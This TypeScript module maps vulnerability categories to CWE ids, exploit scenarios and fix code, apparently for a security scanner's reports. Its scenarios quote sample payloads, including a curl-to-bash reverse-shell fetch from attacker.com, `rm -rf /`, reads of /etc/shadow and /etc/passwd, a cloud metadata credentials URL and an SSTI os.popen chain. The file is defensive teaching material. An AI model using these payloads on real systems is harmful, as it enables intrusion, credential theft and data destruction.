/**
 * Per-category metadata: CWE, plain-language description, exploit scenario,
 * recommended fix (prose), and fix code (copy-pasteable example).
 */

export interface CategoryMeta {
  cwe: string
  title: string
  description: string
  exploitScenario: string
  recommendedFix: string
  fixCode: string           // copy-pasteable corrected code snippet
}

const META: Record<string, CategoryMeta> = {
  sql_query: {
    cwe: 'CWE-89',
    title: 'SQL Injection',
    description:
      'User-controlled input flows into a SQL query without sanitisation. An attacker can manipulate the query structure to read, modify or delete arbitrary database records, bypass authentication, or execute stored procedures.',
    exploitScenario:
      '1. Attacker supplies a crafted value such as `\' OR 1=1 --` in a form field or URL parameter.\n' +
      '2. The value is concatenated directly into a SQL string and executed.\n' +
      '3. The database returns all rows, bypassing intended access controls.\n' +
      '4. With stacked queries enabled, the attacker can DROP tables or exfiltrate data via UNION.',
    recommendedFix:
      'Replace string concatenation with parameterised queries (prepared statements). ' +
      'Never interpolate untrusted values into query strings. ' +
      'Apply an allowlist for column names or table names that must be dynamic.',
    fixCode:
`// ❌ VULNERABLE — string interpolation allows SQL injection
const rows = await db.query(\`SELECT * FROM users WHERE id = '\${userId}'\`)

// ✅ FIXED — parameterised query, input never touches query structure
const rows = await db.query(
  'SELECT * FROM users WHERE id = $1',
  [userId]          // passed separately, never interpolated
)

// ✅ FIXED — ORM example (Prisma / Drizzle)
const user = await prisma.user.findUnique({ where: { id: userId } })`,
  },

  code_exec: {
    cwe: 'CWE-78',
    title: 'OS Command Injection / Code Execution',
    description:
      'User-controlled data reaches an OS command execution function (eval, exec, subprocess, Process.Start, etc.) without sanitisation. An attacker can execute arbitrary commands on the server with the process\'s privileges.',
    exploitScenario:
      '1. Attacker supplies `; curl https://attacker.com/shell.sh | bash` as a parameter.\n' +
      '2. The application concatenates this into a shell command and passes it to exec().\n' +
      '3. The injected commands run server-side, downloading and executing a reverse shell.\n' +
      '4. Attacker gains interactive access to the server.',
    recommendedFix:
      'Avoid passing user input to shell commands entirely. ' +
      'If unavoidable, use array-form APIs that never invoke a shell. ' +
      'Validate input against a strict allowlist before use.',
    fixCode:
`// ❌ VULNERABLE — shell interpolation, attacker can inject ; && |
import { exec } from 'child_process'
exec(\`convert \${filename} output.png\`, callback)

// ❌ VULNERABLE — eval() with user input
eval(userCode)

// ✅ FIXED — array-form, no shell is invoked, metacharacters are inert
import { execFile } from 'child_process'
// Allowlist: only safe characters
const safeName = filename.replace(/[^a-zA-Z0-9._-]/g, '')
if (!safeName) throw new Error('Invalid filename')
execFile('convert', [safeName, 'output.png'], callback)

// ✅ FIXED (Deno) — use Deno.Command instead of shell string
const cmd = new Deno.Command('convert', { args: [safeName, 'output.png'] })
const { code } = await cmd.output()`,
  },

  os_command: {
    cwe: 'CWE-78',
    title: 'OS Command Injection',
    description:
      'User input is passed to a shell command without escaping. An attacker can append shell metacharacters to execute arbitrary commands.',
    exploitScenario:
      '1. Attacker sends `filename; rm -rf /` as a file name input.\n' +
      '2. The application builds `ls {input}` and passes it to the shell.\n' +
      '3. The shell executes both `ls filename` and `rm -rf /`.',
    recommendedFix:
      'Use array-form command execution APIs that bypass the shell. Validate and sanitise all inputs.',
    fixCode:
`// ❌ VULNERABLE — shell=true / string interpolation
import { exec } from 'child_process'
exec(\`ls \${userInput}\`)           // attacker: "dir; curl attacker.com|sh"

// ✅ FIXED — array form bypasses shell; metacharacters are literal args
import { execFile } from 'child_process'
const allowed = /^[a-zA-Z0-9_.-]+$/.test(userInput)
if (!allowed) throw new Error('Invalid input')
execFile('ls', [userInput], (err, stdout) => { /* ... */ })

// ✅ FIXED (Deno)
const cmd = new Deno.Command('ls', { args: [userInput] })
const { stdout } = await cmd.output()`,
  },

  path_traversal_candidate: {
    cwe: 'CWE-22',
    title: 'Path Traversal',
    description:
      'User-controlled input is used to construct a file-system path without canonicalisation. An attacker can supply sequences like `../../etc/passwd` to read or write files outside the intended directory.',
    exploitScenario:
      '1. Attacker sends `filename=../../etc/shadow` in a request.\n' +
      '2. The server joins the base directory with the input and opens the resulting path.\n' +
      '3. The attacker reads the shadow password file, obtaining password hashes.',
    recommendedFix:
      'Resolve the full canonical path and verify it starts with the expected base directory. ' +
      'Reject inputs containing `..`, null bytes, or URL-encoded equivalents.',
    fixCode:
`// ❌ VULNERABLE — naive join allows ../../ traversal
import { readFileSync } from 'fs'
import { join } from 'path'
const content = readFileSync(join('/var/uploads', req.query.file as string))

// ✅ FIXED — resolve to canonical path and check the prefix
import { readFileSync } from 'fs'
import { resolve, sep } from 'path'

const BASE_DIR = resolve('/var/uploads')
const requested = resolve(BASE_DIR, req.query.file as string)

// Strict prefix check — must start with base + separator
if (!requested.startsWith(BASE_DIR + sep)) {
  throw new Error('Path traversal attempt blocked')
}
const content = readFileSync(requested)

// ✅ FIXED (Deno)
const base = new URL('file:///var/uploads/')
const target = new URL(req.query.file as string, base)
if (!target.pathname.startsWith(base.pathname)) throw new Error('Traversal blocked')
const content = await Deno.readTextFile(target)`,
  },

  ssrf_candidate: {
    cwe: 'CWE-918',
    title: 'Server-Side Request Forgery (SSRF)',
    description:
      'User-controlled input is used as the target URL of a server-side HTTP request. An attacker can redirect the request to internal services, cloud metadata endpoints, or private network hosts.',
    exploitScenario:
      '1. Attacker supplies `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as the URL.\n' +
      '2. The server fetches this URL from inside the cloud environment.\n' +
      '3. Temporary AWS/GCP credentials are returned to the attacker.',
    recommendedFix:
      'Validate URLs against an allowlist of permitted hosts and schemes. ' +
      'Resolve DNS and reject private/loopback/link-local addresses. ' +
      'Use a dedicated egress proxy that enforces network policy.',
    fixCode:
`// ❌ VULNERABLE — fetch with unvalidated user-supplied URL
const url = req.body.url
const response = await fetch(url)   // attacker can target 169.254.169.254, localhost, etc.

// ✅ FIXED — strict host allowlist
const ALLOWED_HOSTS = new Set(['api.example.com', 'cdn.example.com'])
const ALLOWED_SCHEMES = new Set(['https:'])

function validateUrl(raw: string): URL {
  let parsed: URL
  try { parsed = new URL(raw) } catch { throw new Error('Invalid URL') }
  if (!ALLOWED_SCHEMES.has(parsed.protocol)) throw new Error('Scheme not allowed')
  if (!ALLOWED_HOSTS.has(parsed.hostname))   throw new Error('Host not allowed')
  return parsed
}

const safeUrl = validateUrl(req.body.url)
const response = await fetch(safeUrl)

// ✅ EXTRA — also block private IP ranges after DNS resolution
// Use a library such as \`is-ip\` + \`ip-private\` before making the request.`,
  },

  open_redirect_candidate: {
    cwe: 'CWE-601',
    title: 'Open Redirect',
    description:
      'User-controlled input is used as a redirect destination without validation. An attacker can craft a link that redirects victims to a malicious site after passing through a trusted domain.',
    exploitScenario:
      '1. Attacker sends victims: `https://trusted.com/redirect?next=https://phishing.com`.\n' +
      '2. The application redirects the browser to the attacker-controlled URL.\n' +
      '3. Victim lands on a phishing page, trusting it because the original link looked legitimate.',
    recommendedFix:
      'Use an allowlist of permitted redirect targets. ' +
      'If dynamic redirects are needed, use opaque tokens mapped server-side to real URLs.',
    fixCode:
`// ❌ VULNERABLE — redirect to arbitrary user-supplied URL
res.redirect(req.query.next as string)

// ✅ FIXED — allowlist of safe paths (relative only)
const ALLOWED_PATHS = new Set(['/dashboard', '/profile', '/home', '/settings'])

const next = req.query.next as string ?? '/home'
// Reject anything with a scheme or host (absolute URLs)
const safeNext = ALLOWED_PATHS.has(next) ? next : '/home'
res.redirect(safeNext)

// ✅ FIXED — token-based approach
// Map short opaque tokens to full URLs server-side
const REDIRECT_MAP: Record<string, string> = {
  dashboard: '/dashboard',
  profile:   '/profile',
}
const dest = REDIRECT_MAP[req.query.token as string] ?? '/home'
res.redirect(dest)`,
  },

  xxe_candidate: {
    cwe: 'CWE-611',
    title: 'XML External Entity (XXE)',
    description:
      'An XML parser processes user-supplied XML with external entity resolution enabled. An attacker can exfiltrate local files, perform SSRF, or cause denial of service.',
    exploitScenario:
      '1. Attacker submits XML declaring `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.\n' +
      '2. The parser resolves the entity and substitutes the file contents.\n' +
      '3. The file contents appear in the application\'s response.',
    recommendedFix:
      'Disable DTD processing and external entity resolution on the XML parser.',
    fixCode:
`// ❌ VULNERABLE — default XML parser allows external entities
import { parseXml } from 'some-xml-lib'
const doc = parseXml(userXml)   // may resolve <!ENTITY xxe SYSTEM "file:///etc/passwd">

// ✅ FIXED (Node / Deno) — use a safe parser that disables DTD by default
// Option 1: fast-xml-parser (safe by default)
import { XMLParser } from 'fast-xml-parser'
const parser = new XMLParser({
  allowBooleanAttributes: true,
  // DTD / entities are NOT processed by default
})
const doc = parser.parse(userXml)

// ✅ FIXED (Java equivalent reference)
// DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);`,
  },

  template_injection: {
    cwe: 'CWE-94',
    title: 'Server-Side Template Injection (SSTI)',
    description:
      'User input is rendered inside a server-side template without escaping. An attacker can inject template directives to read server variables or execute arbitrary code.',
    exploitScenario:
      '1. Attacker enters `{{7*7}}` into a name field.\n' +
      '2. The template engine evaluates the expression and renders `49`.\n' +
      '3. Attacker escalates to `{{config.__class__.__init__.__globals__["os"].popen("id").read()}}`.',
    recommendedFix:
      'Never pass raw user input to a template rendering function. Use auto-escaping and sandbox the template environment.',
    fixCode:
`// ❌ VULNERABLE — user value interpolated into template source string
import nunjucks from 'nunjucks'
const html = nunjucks.renderString(
  \`Hello {{ \${userName} }}!\`,  // attacker controls template source
  {}
)

// ✅ FIXED — pass user data as a context variable, never in the template string
const html = nunjucks.renderString(
  'Hello {{ name }}!',   // static template
  { name: userName }     // user value is a data variable, auto-escaped
)

// ✅ FIXED — use a logic-less template (Mustache / Handlebars in strict mode)
import Mustache from 'mustache'
const html = Mustache.render('Hello {{name}}!', { name: userName })
// Mustache HTML-escapes by default; use {{{name}}} only for trusted content`,
  },

  unsafe_deser: {
    cwe: 'CWE-502',
    title: 'Unsafe Deserialisation',
    description:
      'User-controlled data is deserialised using an unsafe function (pickle, yaml.load, ObjectInputStream, etc.). An attacker can craft a payload that executes arbitrary code during deserialisation.',
    exploitScenario:
      '1. Attacker sends a crafted serialised object containing a malicious `__reduce__` method.\n' +
      '2. The server deserialises the object, triggering the method.\n' +
      '3. Arbitrary code executes with the server process\'s privileges.',
    recommendedFix:
      'Never deserialise untrusted data with unsafe functions. Use safe alternatives and validate schema after parsing.',
    fixCode:
`// ❌ VULNERABLE — JSON.parse result passed directly to sensitive operations
//    or used with eval / Function constructor
const data = JSON.parse(req.body)   // unvalidated — shape is fully attacker-controlled
processOrder(data.orderId, data.items)

// ✅ FIXED — validate schema immediately after parsing
import Ajv from 'ajv'
const ajv = new Ajv()
const schema = {
  type: 'object',
  required: ['orderId', 'items'],
  properties: {
    orderId: { type: 'string', pattern: '^[a-f0-9-]{36}$' },
    items:   { type: 'array',  maxItems: 100 }
  },
  additionalProperties: false
}
const validate = ajv.compile(schema)
const data = JSON.parse(req.body)
if (!validate(data)) throw new Error('Invalid payload: ' + ajv.errorsText(validate.errors))
processOrder(data.orderId, data.items)

// ✅ FIXED (Python) — safe_load instead of load
# import yaml
# data = yaml.safe_load(user_input)   # NOT yaml.load(user_input, Loader=yaml.Loader)`,
  },

  file_access: {
    cwe: 'CWE-73',
    title: 'External Control of File Name or Path',
    description:
      'User-controlled input influences a file system operation (open, read, write, delete). Without proper validation this can lead to unauthorised file access or modification.',
    exploitScenario:
      '1. Attacker supplies a file name that resolves outside the intended directory.\n' +
      '2. The application opens the file and returns its contents.\n' +
      '3. Sensitive configuration or key material is exposed.',
    recommendedFix:
      'Canonicalise the path and assert it falls within the allowed base directory. Use a fixed allowlist where possible.',
    fixCode:
`// ❌ VULNERABLE — file name from user input, no path confinement
import { readFile } from 'fs/promises'
const content = await readFile(\`/app/reports/\${req.query.name}\`, 'utf8')

// ✅ FIXED — allowlist of known report names (no path at all)
const ALLOWED_REPORTS = new Set(['q1-2024', 'q2-2024', 'q3-2024'])
const name = req.query.name as string
if (!ALLOWED_REPORTS.has(name)) throw new Error('Report not found')
const content = await readFile(\`/app/reports/\${name}.pdf\`, 'utf8')

// ✅ FIXED — canonical path check when dynamic names are unavoidable
import { resolve, sep } from 'path'
import { readFile } from 'fs/promises'

const BASE = resolve('/app/reports')
const target = resolve(BASE, req.query.name as string)
if (!target.startsWith(BASE + sep)) throw new Error('Access denied')
const content = await readFile(target, 'utf8')`,
  },

  reflection: {
    cwe: 'CWE-470',
    title: 'Unsafe Reflection',
    description:
      'User input is used to dynamically load a class or invoke a method via reflection. An attacker can instantiate unintended classes, potentially leading to code execution.',
    exploitScenario:
      '1. Attacker supplies a class name pointing to a gadget class with a malicious static initialiser.\n' +
      '2. The application loads and instantiates the class.\n' +
      '3. The gadget\'s constructor executes attacker-controlled code.',
    recommendedFix:
      'Validate dynamic class names against a strict allowlist. Prefer a registry/factory pattern with hardcoded mappings.',
    fixCode:
`// ❌ VULNERABLE — dynamic require / import with user-controlled value
const pluginName = req.body.plugin
const plugin = require(\`./plugins/\${pluginName}\`)   // attacker: "../../../etc/passwd"

// ✅ FIXED — explicit registry; user input selects a key, never a path
const PLUGINS: Record<string, () => unknown> = {
  csv:  () => import('./plugins/csv'),
  json: () => import('./plugins/json'),
  xml:  () => import('./plugins/xml'),
}

const loader = PLUGINS[req.body.plugin]
if (!loader) throw new Error('Unknown plugin')
const plugin = await loader()`,
  },
}

const DEFAULT_META: CategoryMeta = {
  cwe: 'CWE-20',
  title: 'Input Validation Issue',
  description:
    'User-controlled input reaches a sensitive operation without sufficient validation or sanitisation.',
  exploitScenario:
    '1. Attacker supplies a malicious payload in a user-controlled field.\n' +
    '2. The input is processed without validation.\n' +
    '3. The application behaves unexpectedly, potentially exposing data or functionality.',
  recommendedFix:
    'Validate and sanitise all user-controlled input before use. ' +
    'Apply the principle of least privilege and defence in depth.',
  fixCode:
`// ✅ General input validation pattern
function validateInput(value: unknown, schema: { type: string; maxLength?: number }): string {
  if (typeof value !== schema.type) throw new Error('Invalid type')
  if (schema.type === 'string' && schema.maxLength) {
    const s = value as string
    if (s.length > schema.maxLength) throw new Error('Input too long')
    // Strip control characters
    return s.replace(/[\\x00-\\x1F\\x7F]/g, '')
  }
  return String(value)
}`,
}

export function getCategoryMeta(category: string): CategoryMeta {
  return META[category] ?? DEFAULT_META
}
